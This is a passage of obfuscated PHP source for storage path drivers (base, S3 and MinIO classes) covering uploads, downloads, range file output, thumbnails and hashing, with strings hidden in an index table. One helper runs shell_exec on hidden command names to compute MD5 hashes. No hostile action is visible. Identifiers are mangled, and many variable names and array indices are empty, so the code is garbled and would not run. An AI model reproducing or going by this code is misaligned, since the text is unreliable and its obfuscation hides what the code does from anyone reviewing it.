str_replace(trim(get_url_root($滁), $[8]), trim($this->cdnHost, $[8]), $滁); } public function uploadLink($Δ, $ͨ = 0) { $ߎ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $ = $this->getType(); if (!in_array($, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $܉ = 1024 * 1024 * 10; $ޢ = $ͨ <= $܉ ? $ߎ[92] : $ߎ[93]; $˗ = (!$ͨ ? 1 : ceil($ͨ / pow(1024, 3))) * 3600 * 4; $ý = $this->{$ޢ}($Δ, $˗); if ($ý) { $ý[$ߎ[94]] = $Δ; $ý[$ߎ[95]] = $; } return $ý; } public function uploadFormData($تƮ, $ = 3600) { } public function multiUploadFormData($ɱ, $ = 3600) { } public function download($诳, $ܣ) { } public function ext($̩ߥ) { $ꊫԄ =& $_SERVER[]; if (strpos($̩ߥ, $ꊫԄ[8]) === -1) { $쟙 = $̩ߥ; } else { $쟙 = $this->pathThis($̩ߥ); } $ = $ꊫԄ[12]; if (strstr($쟙, $ꊫԄ[10])) { $ = substr($쟙, strrpos($쟙, $ꊫԄ[10]) + 1); $ = strtolower($); } if (strlen($) > 3 && preg_match($ꊫԄ[96], $, $ܡֲ)) { $ = $ꊫԄ[12]; } return $; } public function pathThis($ۅ΋) { $Ņ =& $_SERVER[]; $ۅ΋ = str_replace($Ņ[97], $Ņ[8], rtrim($ۅ΋, $Ņ[8])); $ = strrpos($ۅ΋, $Ņ[8]); if ($ === !1) { return $ۅ΋; } return substr($ۅ΋, $ + 1); } public function pathFather($ۄ) { $ =& $_SERVER[]; $ۄ = str_replace($[97], $[8], rtrim($ۄ, $[8])); $ = strrpos($ۄ, $[8]); if ($ === !1) { return $[12]; } return substr($ۄ, 0, $ + 1); } public function hashSimple($Гᰉ) { $Ҿ =& $_SERVER[]; if (!$Гᰉ) { return md5($Ҿ[12]); } $ = $this->size($Гᰉ); $ = 200; $ = 50; if ($ <= $ * $) { return $this->hashMd5($Гᰉ) . $; } $ = intval($ / $); $㎪ = $Ҿ[12]; for ($ = 0; $ < $; $++) { $㎪ .= $this->fileSubstr($Гᰉ, $ * $, $); } $㎪ .= $this->fileSubstr($Гᰉ, $ - $, $); return md5($㎪) . $; } public static $md5Cache = array(); public function hashMd5($ѨѤ) { if (!$ѨѤ) { return md5($_SERVER[][12]); } $ѨѤ = $this->iconvSystem($ѨѤ); if (isset(self::$md5Cache[$ѨѤ])) { return self::$md5Cache[$ѨѤ]; } self::$md5Cache[$ѨѤ] = $this->hashMd5Shell($ѨѤ); if (!self::$md5Cache[$ѨѤ]) { self::$md5Cache[$ѨѤ] = @md5_file($ѨѤ); } return self::$md5Cache[$ѨѤ]; } private function hashMd5Shell($) { $ =& $_SERVER[]; if (!$) { return md5($[12]); } if (!function_exists($[98])) { return !1; } $ٽ = array($[99], $[100]); $ = Cache::get($[101]); if (!$) { $ = BASIC_PATH . $[102]; $̚ϖ = md5_file($); $ = $[103]; foreach ($ٽ as $ܖ̗) { $ܨի = shell_exec($ܖ̗ . "\40\42{$}\x22"); if ($ܨի && substr(trim($ܨի), 0, 32) == $̚ϖ) { $ = $ܖ̗; break; } } Cache::set($[101], $, 3600); } if ($ == $[103]) { return !1; } $ܨի = shell_exec($ . "\x20\42{$}\42"); $ܨի = str_replace($[104], $[12], $ܨի); return substr($ܨի, 0, 32); } public function link($к) { return $к; } public function fileOut($, $ƙ§ = false, $ = false, $̬ = '') { $˵ =& $_SERVER[]; $this->cacheMethod(null, null); if (!$ || !$this->exist($)) { show_json(LNG($˵[105]), !1, $); } $ = $this->getType() == $˵[106]; $Ϩ = $GLOBALS[$˵[6]][$˵[89]][$˵[107]][$˵[108]]; $ = (double) $GLOBALS[$˵[6]][$˵[89]][$˵[107]][$˵[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $֦ = $this->infoFull($); $Յ = $֦[$˵[76]]; $Κ = gmdate($˵[110], $֦[$˵[85]]); $ = $ ? $ : $this->iconvApp($֦[$˵[32]]); $ = 0; $ƕ = $Յ - 1; $ڰ = $this->ext($); if (in_array($ڰ, array($˵[111], $˵[112], $˵[113], $˵[114]))) { $ڰ = $˵[115]; } if (in_array($ڰ, array($˵[116]))) { $ڰ = $˵[117]; } if (!$̬) { $̬ = md5($Κ . $Յ); } $̬ = $˵[118] . $̬ . $˵[118]; $ꕞ = get_file_mime($ڰ); $㐒 = !0; $㐒 = isset($_GET[$˵[119]]) ? !1 : !0; if ($ƙ§ === !1 && !mime_support($ꕞ)) { $ꕞ = $˵[120]; } header($˵[121]); header($˵[122] . $ꕞ); $נ = rawurlencode($); $נ = $˵[118] . $נ . $˵[123] . $נ; if ($ƙ§) { header($˵[124]); header($˵[125] . $נ); } else { if ($㐒) { header($˵[126] . $נ); } } header($˵[127] . gmdate($˵[110], time() + 3600 * 24 * 30) . $˵[128]); header($˵[129]); header($˵[130]); header($˵[131]); if (isset($_SERVER[$˵[132]]) && strtotime($_SERVER[$˵[132]]) == $֦[$˵[85]]) { header($˵[133], !0, 304); die; } if (isset($_SERVER[$˵[134]]) && $_SERVER[$˵[134]] == $̬) { header($˵[135] . $̬, !0, 304); die; } header($˵[135] . $̬); header($˵[136] . $Κ . $˵[128]); header($˵[137] . $); header($˵[138]); header($˵[139] . $Յ); header($˵[140]); Hook::trigger($˵[141], $, $Յ, $, $ڰ); if (!$ƙ§ && $ڰ == $˵[142]) { if ($Յ > 1024 * 1024 * 5) { die; } $ӎΝ = $this->getContent($); $ӎΝ = Html::clearSVG($ӎΝ); header($˵[143] . strlen($ӎΝ)); echo $ӎΝ; die; } $ɴ = strtolower($_SERVER[$˵[144]]); if ($ && $ɴ && $Ϩ) { if (strstr($ɴ, $˵[145])) { header($˵[146] . $); } else { if (strstr($ɴ, $˵[147])) { header($˵[148] . $); } else { if (strstr($ɴ, $˵[149])) { header($˵[150] . $); } } } if ($) { header($˵[151] . $); } return; } if (isset($_SERVER[$˵[152]])) { if (preg_match($˵[153], $_SERVER[$˵[152]], $ɞ)) { $ = intval($ɞ[1]); $ = $ <= 0 ? 0 : ($ >= $ƕ ? $ƕ : $); if (!empty($ɞ[2])) { $ȼ΍ = intval($ɞ[2]); $ƕ = $ȼ΍ < $ ? $ : ($ȼ΍ >= $ƕ ? $ƕ : $ȼ΍); } } header($˵[154]); header("\103\157\x6e\x74\x65\x6e\164\x2d\122\141\x6e\147\x65\x3a\40\x62\x79\x74\145\163\x20{$}\x2d{$ƕ}\x2f" . $Յ); } else { header($˵[155]); } header($˵[156]); $ޫ = !0; if ($_SERVER[$˵[157]] == $˵[158] && $Յ > 1204 * 1024 * 1024 * 2) { $ޫ = !1; } if ($ޫ) { header($˵[159] . ($ƕ - $ + 1)); } if ($_SERVER[$˵[160]] == $˵[161]) { return; } $ = 1024 * 100; $ͩ = 0; if ($) { $ͩ = intval(1000 * 1000 * ($ / $)); } while ($ <= $ƕ) { $֢ȴ = timeFloat(); check_abort(); $ɫ = $ƕ - $ + 1; if ($ɫ <= $) { $ = $ɫ; } echo $this->fileSubstr($, $, $); $ += $; if ($ == $ɫ) { $ = $ƕ + 1; } if ($ͩ) { $췂 = intval(1000 * 1000 * (timeFloat() - $֢ȴ)); $ = $ͩ - $췂; if ($ > 5) { usleep($); } } } } public function fileOutServer($, $㰲 = false, $ = false, $¨ = '') { $this->fileOut($, $㰲, $, $¨); } public function fileOutLink($) { header($_SERVER[][162] . $); die; } public function cacheMethod($, $فΒ, $츺 = null) { $Ќ˸ =& $_SERVER[]; static $ = array(); $ = $فΒ ? ltrim($this->getPathOuter($فΒ), $Ќ˸[8]) : $Ќ˸[12]; $ = $Ќ˸[163] . $ . $Ќ˸[164] . rtrim($, $Ќ˸[8]); if (is_null($)) { $ = array(); return; } if (is_null($فΒ)) { foreach ($ as $ => $) { if (!strstr($, $Ќ˸[163] . $ . $Ќ˸[165])) { continue; } unset($[$]); } return; } if (!is_null($츺)) { $[$] = $츺; return; } $ʥ = isset($[$]) ? $[$] : null; if (!is_null($ʥ)) { return $ʥ; } $ʥ = $this->{$}($فΒ); $[$] = $ʥ; return $ʥ; } public function cacheMethodInfoSet($, $ɓ, $Α = false) { $ɻ =& $_SERVER[]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ɻ[166], $, $ɓ); $this->cacheMethod($ɻ[167], $, $ɓ ? !1 : !0); if (is_array($Α)) { $this->cacheMethod($ɻ[168], $, $Α); } } public function fileOutImage($Õ, $م = 250) { $ =& $_SERVER[]; set_timeout(); if (substr($Õ, 0, 4) == $[149]) { $this->fileOutLink($Õ); } $ = $this->info($Õ); $̗҉ = !1; $ܚ = isset($GLOBALS[$[169]]) ? $GLOBALS[$[169]] : array(); if ($ܚ && $ܚ[$[170]] == $[$[84]]) { $ = $ܚ; $ = $[$[171]]; if ($ && isset($[$[172]])) { if ($[$[172]] <= $م && $[$[173]] <= $م) { $̗҉ = !0; } } } if ($[$[76]] <= 1024 * 50 || $̗҉ || !function_exists($[174]) || $[$[175]] == $[176]) { return $this->fileOut($Õ, !1, $[$[32]]); } $׭ = kodIO::hashPath($); $ = "\x63\x6f\x76\145\162\137{$׭}\137{$م}\x2e\160\x6e\147"; $۩ = IO_PATH_SYSTEM_TEMP . $[177]; $ = IO::infoFullSimple($۩); $ = $ && is_array($) ? $[$[84]] : $[12]; if (!$) { $ = IO::mkdir($۩); } if ($[$[178]] == $[179] && isset($[$[180]]) && $[$[180]] == kodIO::sourceID($)) { $숰 = $[$[181]]; if ($م <= 500) { $ɡ = preg_replace($[182], $[183], $[$[32]]); $숰 = IO::fileNameExist($, $ɡ); } return IO::fileOut(KodIO::make($숰), !1, $[$[32]]); } $ = IO::fileNameExist($, $); if ($) { return IO::fileOut(KodIO::make($), !1, $[$[32]]); } if ($م > 1000) { $this->makeImageCover($, $Õ, $, $م); $this->makeImageCover($, $Õ, "\x63\157\166\x65\x72\137{$׭}\x5f\62\65\x30\x2e\160\156\147", 250); $ = IO::fileNameExist($, $); if ($) { return IO::fileOut(KodIO::make($), !1, $[$[32]]); } die; } $ǯ = Cache::get($); if ($ǯ == $[184] || $ǯ == $[185]) { echo $ǯ; die; } Cache::set($, $[185], 60); $ = array($, $[$[84]], $, $م); $Ȝ = $[186] . $[$[76]] . $[187] . $ . $[188] . $[$[32]] . $[189] . $[$[84]]; TaskQueue::add($[190], $, $Ȝ, $); } public function makeImageCover($Ѹ, $ڌ, $, $ƆǨ) { $ =& $_SERVER[]; if (IO::fileNameExist($Ѹ, $)) { return $[191]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ = DATA_THUMB . $; del_file($); $ω = TEMP_FILES . $; if (!@file_exists($ω)) { $ω = IO::download($ڌ, $ω); } if (!@file_exists($ω)) { return $[192]; } ImageThumb::createThumb($ω, $, $ƆǨ, $ƆǨ * 10); if (@file_exists($)) { Cache::remove($); return IO::move($, $Ѹ); } Cache::set($, $[184], 600); del_file($); return $[193] . $ω . $[71]; } public function fileOutImageServer($Á, $ = 250) { $this->fileOutImage($Á, $); } public function fileNameAuto($, $볫, $Ɓ = REPEAT_RENAME, $ዥ = false) { $ā =& $_SERVER[]; $ = $ === $ā[12] ? $볫 : rtrim($, $ā[8]) . $ā[8] . $볫; if ($Ɓ == REPEAT_REPLACE || !$this->exist($) || $ዥ && $Ɓ != REPEAT_RENAME_FOLDER) { return $볫; } if ($Ɓ == REPEAT_SKIP) { return !1; } $ = $ā[10] . get_path_ext($볫); $ = $ == $ā[10] || $ዥ ? $ā[12] : $; $ = 1; $ = substr($볫, 0, strlen($볫) - strlen($)); $δ = $ . "\x28{$}\x29{$}"; while ($this->exist(rtrim($, $ā[8]) . $ā[8] . $δ)) { $δ = $ . "\x28{$}\51{$}"; $++; } return $δ; } private function fileNameAutoList($߹, $ξ, $ = false) { $ =& $_SERVER[]; $ܩ = $this->listPath($߹, !0); $ܩ = array_merge($ܩ[$[82]], $ܩ[$[83]]); $ = array_to_keyvalue($ܩ, $[12], $[32]); $ޘ = $[10] . get_path_ext($ξ); $ޘ = $ޘ == $[10] || $ ? $[12] : $ޘ; $ = substr($ξ, 0, strlen($ξ) - strlen($ޘ)); $ا = $ . "\x28\60\51{$ޘ}"; for ($㦡 = 1; $㦡 <= count($) + 1; $㦡++) { $ا = $ . "\50{$㦡}\x29{$ޘ}"; if (!in_array_not_case($ا, $)) { return $ا; } } return $ا; } public function listAllFiles($, $׻) { $ =& $_SERVER[]; if (empty($׻)) { return array(); } $˱ = array_keys($׻); $ƅ = array(); $ = trim($, $[8]); foreach ($׻ as $ӛٴ => $ۮʸ) { $ = ltrim(substr(trim($ӛٴ, $[8]), strlen($)), $[8]); if (substr($ӛٴ, -1) == $[8]) { $ = rtrim($, $[8]) . $[8]; } $ƅ = array_merge($ƅ, $this->slicePath($)); } $ = array(); foreach (array_unique($ƅ) as $) { $渆 = array($[84] => $this->getPathOuter($[8] . $ . $[8] . $), $[75] => 1, $[76] => 0); if (substr($, -1) != $[8]) { $渆[$[75]] = 0; $鲀 = $this->getPath($ . $[8] . $); if (isset($׻[$鲀])) { $Յ = $׻[$鲀]; if (isset($Յ[$[76]])) { $渆[$[76]] = intval($Յ[$[76]]); } if (isset($Յ[$[194]])) { $渆[$[85]] = intval($Յ[$[194]]); } } } $[] = $渆; } return $; } public function slicePath($ư) { $ =& $_SERVER[]; $Ԉޱ = explode($[8], trim($ư, $[8])); $ъ = 0; do { ++$ъ; $ۥ[] = implode($[8], array_slice($Ԉޱ, 0, $ъ)) . $[8]; } while ($ъ < count($Ԉޱ)); $ۥ[count($Ԉޱ) - 1] = $ư; return $ۥ; } public function getHost() { $ګ =& $_SERVER[]; $膽 = parse_url(trim($this->domain, $ګ[8])); $䪔 = isset($膽[$ګ[195]]) ? $膽[$ګ[195]] : http_type(); $͋ = isset($膽[$ګ[196]]) ? $膽[$ګ[196]] : $膽[$ګ[84]]; if (isset($膽[$ګ[197]])) { $͋ .= $ګ[4] . $膽[$ګ[197]]; } return $䪔 . $ګ[198] . $͋; } public function pathEncode($) { $蕳 =& $_SERVER[]; return str_replace($蕳[199], $蕳[8], rawurlencode($)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($) { set_timeout(); require_once SDK_DIR . $_SERVER[][200]; parent::__construct(); $this->_init($); } public function _init($ҙ) { $this->config = $ҙ; foreach ($ҙ as $Ǭ => $ς) { if (isset($this->{$Ǭ})) { $this->{$Ǭ} = $ς; } } $this->endpoint = $ҙ[$_SERVER[][201]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ = "\166\64") { $this->signVer = $; $this->client->setSignatureVersion($); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ڶ =& $_SERVER[]; $ = $this->getBucketCors(); if (!$ || !is_array($)) { return !1; } if ($[$ڶ[202]] != $ڶ[203] || $[$ڶ[204]] != $ڶ[203]) { return !1; } $˩ = array_map($ڶ[205], $[$ڶ[206]]); if (!is_array($˩)) { $˩ = array(); } $Օ = array($ڶ[207], $ڶ[208], $ڶ[209], $ڶ[210], $ڶ[211]); $Ν = array_diff($Օ, $˩); return empty($Ν); } public function mkfile($, $ = '', $Ǔ = REPEAT_RENAME) { $ = $this->setContent($, $); if ($ !== !1) { return $this->getPathOuter($); } return !1; } public function mkdir($, $ހ = REPEAT_SKIP) { $ =& $_SERVER[]; if (empty($) && $ !== $[212]) { return !1; } if ($ހ && $this->_isFolder($)) { return $this->getPathOuter($); } $ާּ = $this->setContent($, $[12], !0); if ($ާּ !== !1) { return $this->getPathOuter($); } return !1; } public function copyFile($ʑ, $, $ѓ = array()) { $ =& $_SERVER[]; $ѐ = $this->objectMeta($ʑ); if (!$ѐ) { return !1; } if ($ѐ[$[76]] <= 1024 * 1024 * 200) { $ = $this->client->copyObject($this->bucket, $ʑ, $this->bucket, $, $[213], $ѓ); } else { $ = $this->client->multiCopyObject($this->bucket, $ʑ, $this->bucket, $, $ѓ); } $ = $ ? $this->getPathOuter($) : !1; return $; } public function moveFile($ؓ, $) { if ($this->copyFile($ؓ, $)) { $this->delFile($ؓ); return $this->getPathOuter($); } return !1; } public function delFile($܇) { return $this->client->deleteObject($this->bucket, $܇); } public function delFolder($) { $ =& $_SERVER[]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($); $this->listItemCache = !0; $ = trim($, $[8]) . $[8]; if (!empty($) && $ !== $[212] && !in_array($, $[$[82]])) { $[$[82]][] = $; } $ꂺ = $this->delByBatch($[$[83]]); if (!$ꂺ) { return !1; } $ꂺ = $this->delByBatch($[$[82]]); if (!$ꂺ) { return !1; } return $this->delFile($); } private function delByBatch($ǎ) { foreach (array_chunk($ǎ, 1000) as $祽ކ) { $ = $this->client->deleteObjects($this->bucket, $祽ކ); if (!$) { return !1; } } return !0; } public function rename($, $ؕ϶) { return $this->renameObject($, $ؕ϶); } public function listPath($, $ = false) { $ѵ =& $_SERVER[]; $ɋ̳ = $this->fileList($, $ѵ[8], !0); foreach ($ɋ̳[$ѵ[82]] as $̭ => $셱) { $ɋ̳[$ѵ[82]][$̭] = $this->folderInfo($셱, $, $셱); } foreach ($ɋ̳[$ѵ[83]] as $̭ => $셱) { $ɋ̳[$ѵ[83]][$̭] = $this->fileInfo($셱[$ѵ[32]], $, $셱); } return $ɋ̳; } protected function infoChildren($ɜ, &$𜇎) { $ =& $_SERVER[]; $ = $this->fileList($ɜ, $[12], !0); $𜇎[$[78]] += count($[$[82]]); $𜇎[$[77]] += count($[$[83]]); foreach ($[$[83]] as $⪵̨) { if (!$⪵̨ || !$⪵̨[$[76]]) { continue; } $𜇎[$[76]] += $⪵̨[$[76]]; } } private function fileInfo($֕, $ǔ = false, $ = array()) { $؃ۧ =& $_SERVER[]; $ = array($؃ۧ[32] => $this->pathThis($֕), $؃ۧ[84] => $this->getPathOuter($֕), $؃ۧ[33] => $؃ۧ[214], $؃ۧ[175] => $this->ext($֕), $؃ۧ[76] => isset($[$؃ۧ[76]]) ? $[$؃ۧ[76]] : 0); if ($ǔ) { return $; } $[$؃ۧ[215]] = $[$؃ۧ[85]] = 0; $[$؃ۧ[216]] = $[$؃ۧ[217]] = !0; if (empty($)) { $ = $this->objectMeta($֕); if (!$) { return $; } } if (isset($[$؃ۧ[218]]) && $[$؃ۧ[218]]) { $[$؃ۧ[219]] = $[$؃ۧ[218]]; } if (isset($[$؃ۧ[194]])) { $[$؃ۧ[85]] = $[$؃ۧ[194]]; } if (isset($[$؃ۧ[76]])) { $[$؃ۧ[76]] = $[$؃ۧ[76]]; } return $; } private function folderInfo($ⲝ, $֖ = false, $ = array()) { $֥ =& $_SERVER[]; $ = array($֥[32] => $this->pathThis($ⲝ), $֥[84] => $this->getPathOuter($֥[8] . $ⲝ), $֥[33] => $֥[75]); if ($֖) { return $; } $[$֥[215]] = $[$֥[85]] = 0; $[$֥[216]] = $[$֥[217]] = !0; if ($ⲝ == $֥[12]) { return $; } if (empty($)) { $ = $this->objectMeta(trim($ⲝ, $֥[8]) . $֥[8]); } if (isset($[$֥[194]])) { $[$֥[215]] = $[$֥[194]]; } return $; } private function fileList($, $ = '', $ = 0) { $ =& $_SERVER[]; $ = rtrim($, $[8]) . $[8]; $ = $this->listObjs($, null, null, $); if (!$) { return array($[82] => array(), $[83] => array()); } $ = $ = array(); foreach ($[$[220]] as $) { $ˁٕ = $[$[32]]; if ($ˁٕ == $) { continue; } $ = isset($[$[76]]) ? $[$[76]] : 0; $ = $ == 0 && substr($ˁٕ, strlen($ˁٕ) - 1, 1) == $[8] ? !0 : !1; $this->cacheMethodInfoSet($ˁٕ, $, $); if ($) { $[] = $ˁٕ; continue; } $[] = $ ? $ : $ˁٕ; } foreach ($[$[221]] as $) { $[] = $[$[32]]; $this->cacheMethodInfoSet($[$[32]], !0); } $this->cacheMethodInfoSet($, !0); return array($[82] => $, $[83] => $); } private function listObjs($᝚, $ = null, $ۘ = null, $ = null) { $ =& $_SERVER[]; $᝚ = trim($᝚, $[8]); $֖ = empty($᝚) && $᝚ !== $[212] ? $[12] : $᝚ . $[8]; return $this->client->getBucket($this->bucket, $֖, $, $ۘ, $, !0); } public function has($ǐ, $ = false, $ = true) { $ۊ =& $_SERVER[]; $ǐ = trim($ǐ, $ۊ[8]); $㥬 = empty($ǐ) && $ǐ !== $ۊ[212] ? $ۊ[12] : $ǐ . $ۊ[8]; $۝ = null; $ = 500; $Ž˯ = $ۊ[8]; $ܬ = $ԓ = array(); while (!0) { $⛞ = $this->listObjs($ǐ, $۝, $, $Ž˯); if (!$⛞) { break; } $۝ = $⛞[$ۊ[222]]; $놞 = $⛞[$ۊ[220]]; $޾ = $⛞[$ۊ[221]]; if (empty($놞) && empty($޾)) { break; } if (count($놞) == 1 && $놞[0][$ۊ[32]] == $㥬) { break; } if ($) { if (count($놞)) { $놞 = array_column($놞, $ۊ[32]); $ܬ = array_merge($ܬ, $놞); } if (count($޾)) { $޾ = array_column($޾, $ۊ[32]); $ԓ = array_merge($ԓ, $޾); } if ($۝ === null) { break; } continue; } if ($) { if (!empty($놞)) { if (count($놞) > 1 || isset($놞[0][$ۊ[32]]) && $놞[0][$ۊ[32]] != $㥬) { return !0; } } } else { if (!empty($޾)) { return !0; } } if ($۝ === null) { break; } } if ($) { $ܬ = array_diff($ܬ, array($㥬)); $ܬ = count(array_unique($ܬ)); $ԓ = count(array_unique($ԓ)); return array($ۊ[223] => $ܬ, $ۊ[224] => $ԓ); } return !1; } public function listAll($) { $ƹ =& $_SERVER[]; $ = $this->fileList($, $ƹ[12], !0); $ܼ = array_to_keyvalue($[$ƹ[83]], $ƹ[32]); foreach ($[$ƹ[82]] as $ӷщ) { if (is_string($ӷщ)) { $ܼ[$ӷщ] = array($ƹ[76] => 0); } } return $this->listAllFiles($, $ܼ); } public function canRead($㢪) { $ =& $_SERVER[]; $ԥ߽ = $this->client->getAccessControlPolicy($this->bucket, $㢪); if (!$ԥ߽) { return !1; } return in_array($ԥ߽, array($[225], $[226], $[227])) ? !0 : !1; } public function canWrite($޲ٵ) { $ɨ =& $_SERVER[]; $ϗ = $this->client->getAccessControlPolicy($this->bucket, $޲ٵ); if (!$ϗ) { return !1; } return in_array($ϗ, array($ɨ[225], $ɨ[226])) ? !0 : !1; } public function getContent($ⲑ) { return $this->client->getObject($this->bucket, $ⲑ); } public function setContent($鰛, $΁ = '', $񰬸 = false) { $А =& $_SERVER[]; $鰛 = $񰬸 ? trim($鰛, $А[8]) . $А[8] : $鰛; $㖶 = get_file_mime(get_path_ext($鰛)); $ܭ = $this->client->putObject($΁, $this->bucket, $鰛, $А[213], array(), $㖶); if (!$ܭ) { return !1; } if ($񰬸) { return !0; } $this->cacheMethod(null, null); $ܭ = $this->copyFile($鰛, $鰛, array($А[228] => $ܭ[$А[218]])); return $ܭ ? !0 : !1; } public function fileSubstr($, $̻, $) { $ = $̻ + $ - 1; return $this->client->getObject($this->bucket, $, array($_SERVER[][229] => "\x62\171\164\x65\163\x3d{$̻}\55{$}")); } public function upload($÷, $, $ܥú = false, $ = REPEAT_REPLACE) { $ =& $_SERVER[]; $Ȏ = array($[228] => @md5_file($)); $ǌ = array($[230] => get_file_mime(get_path_ext($÷))); if (IO::size($) <= 1024 * 1024 * 200) { $ψ = $this->client->putObjectFile($, $this->bucket, $÷, $[213], $Ȏ, $ǌ); return !empty($ψ) ? $this->getPathOuter($÷) : !1; } $ = $this->client->multiUploadObject($, $this->bucket, trim($÷, $[8]), $Ȏ, $ǌ); return $ ? $this->getPathOuter($÷) : !1; } public function download($Ń, $ʹ) { if (!@is_dir($this->pathFather($ʹ)) && !IO::mkdir($this->pathFather($ʹ))) { return !1; } $򌡭 = $this->client->getObject($this->bucket, $Ń, array(), $ʹ); return $򌡭 !== !1 ? $ʹ : !1; } public function link($, $ = array()) { $ =& $_SERVER[]; if ($this->signVer == $[231]) { return $this->client->getAuthenticatedURL($this->bucket, $, 3600 * 12, $); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($, $[8]), 3600 * 12, $this->region, array(), !0, $); } public function fileOut($Ĥߛ, $ͤ = false, $Ћ = false, $ = '') { $ۑ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ĥߛ, $ͤ, $Ћ, $); } if (!$Ћ) { $Ћ = $this->pathThis($Ĥߛ); } $ҋ = get_file_mime(get_path_ext($Ћ)); if ($ҋ == $ۑ[232]) { return parent::fileOut($Ĥߛ, $ͤ, $Ћ, $); } $ʞŰ = array($ۑ[233] => $ҋ); if ($ͤ) { $ʞŰ[$ۑ[234]] = $ۑ[235] . rawurlencode($Ћ); } else { } $ = $this->link($Ĥߛ, $ʞŰ); $this->fileOutLink($); } public function fileOutServer($, $ȣٟ = false, $ = false, $˭ = '') { parent::fileOut($, $ȣٟ, $, $˭); } public function fileOutImageServer($Ą, $ = 250) { parent::fileOutImage($Ą, $); } public function hashMd5($Ĝ닧, $ = '') { $ź =& $_SERVER[]; $ = $this->objectMeta($Ĝ닧); if (!$) { return !1; } $ = $ ? $ : _get($, $ź[236]); $ = $ ? $ : _get($, $ź[218], $ź[12]); return $; } public function uploadFormData($ܝ, $ˁؑ = 3600) { $ڬ =& $_SERVER[]; $얰 = $this->pathFather($ܝ); $ʾ = $this->client->getHttpUploadPostParams($this->bucket, $얰, $ڬ[213], $ˁؑ); return array_merge((array) $ʾ, array($ڬ[196] => $this->getHost())); } public function multiUploadFormData($, $ = 3600) { $ =& $_SERVER[]; $ᓩ = gmdate($[237]); $ = array(); $ʋ = $this->client->getUploadId($this->bucket, $, $); if (!$ʋ) { return !1; } return array($[238] => $ʋ, $[196] => $this->getHost() . $[8] . $this->pathEncode($), $[239] => $ᓩ, $[94] => $); } public function multiUploadAuthData($ś, $̜ = array()) { $ϱ =& $_SERVER[]; $ϋ = isset($̜[$ϱ[239]]) ? $̜[$ϱ[239]] : gmdate($ϱ[237]); $預 = isset($̜[$ϱ[175]]) ? $̜[$ϱ[175]] : $ϱ[12]; $軩Ց = $̜[$ϱ[94]]; unset($̜[$ϱ[94]]); if (isset($̜[$ϱ[240]])) { $̜[$ϱ[239]] = $ϋ; return $this->listUploadParts($軩Ց, $̜); } $ܺ = array($ϱ[241], $ϱ[12], $ϱ[120], $ϱ[12], "\x78\x2d\141\x6d\x7a\x2d\144\x61\164\x65\72{$ϋ}", $ϱ[8] . $this->bucket . $ϱ[8] . $this->pathEncode($軩Ց) . $預); if (strpos($預, $ϱ[242]) === 0) { $ܺ[0] = $ϱ[243]; } if (isset($̜[$ϱ[244]]) && $̜[$ϱ[244]] == $ϱ[245]) { $ܺ[0] = $ϱ[245]; } $ = implode($ϱ[246], $ܺ); $ݶ = base64_encode(hash_hmac($ϱ[247], $, $this->secret, !0)); $ȵϣ = $ϱ[248] . $this->accessKey . $ϱ[4] . $ݶ; if (strpos($預, $ϱ[242]) === 0) { return array($ϱ[249] => $ȵϣ, $ϱ[239] => $ϋ); } return $ȵϣ; } public function listUploadParts($ǀ, $ױ = array()) { $ȩ =& $_SERVER[]; $ο譌 = str_replace($ȩ[250], $ȩ[12], $ױ[$ȩ[175]]); $ = $this->client->listParts($this->bucket, $ǀ, $ο譌); if (!$) { return !1; } unset($ױ[$ȩ[240]], $ױ[$ȩ[244]]); $ױ[$ȩ[94]] = $ǀ; $ = $this->multiUploadAuthData($ǀ, $ױ); if (empty($)) { return !1; } return array($ȩ[249] => $, $ȩ[239] => $ױ[$ȩ[239]], $ȩ[251] => $); } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($ڡ) { $ = $this->objectMeta($ڡ); return $ ? $[$_SERVER[][76]] : 0; } public function info($Ǭ) { if ($this->isFolder($Ǭ)) { return $this->folderInfo($Ǭ); } else { if ($this->isFile($Ǭ)) { return $this->fileInfo($Ǭ); } } return !1; } public function exist($蒍) { return $this->isFile($蒍) || $this->isFolder($蒍); } public function isFile($ˆ) { return !$this->isFolder($ˆ) && $this->objectMeta($ˆ); } public function isFolder($Ȋ) { return $this->cacheMethod($_SERVER[][166], $Ȋ); } protected function objectMeta($ػ) { return $this->cacheMethod($_SERVER[][168], $ػ); } protected function _objectMeta($֔) { $ڴ =& $_SERVER[]; $֔ = rtrim($֔, $ڴ[8]); try { $ٮ = $this->client->getObjectInfo($this->bucket, $֔); if (!isset($ٮ[$ڴ[236]]) && isset($ٮ[$ڴ[252]])) { $ٮ[$ڴ[236]] = $ٮ[$ڴ[252]]; } } catch (Exception $) { $ٮ = !1; } if (!$ٮ) { } return $ٮ; } protected function _isFolder($) { $Ҕ =& $_SERVER[]; $ = rtrim($, $Ҕ[8]); if ($ == $Ҕ[12] || $ == $Ҕ[8]) { return !0; } $ؘ쾨 = $this->client->getBucket($this->bucket, $, null, 1); if (empty($ؘ쾨[$Ҕ[220]])) { return !1; } $ = $ؘ쾨[$Ҕ[220]][0][$Ҕ[32]]; return stripos($, $ . $Ҕ[8]) === 0 ? !0 : !1; if (substr($, -1) == $Ҕ[8]) { return !0; } if (get_path_this($) == get_path_this($)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ⱂ) { parent::__construct($ⱂ); $this->signatureVersion($_SERVER[][231]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() 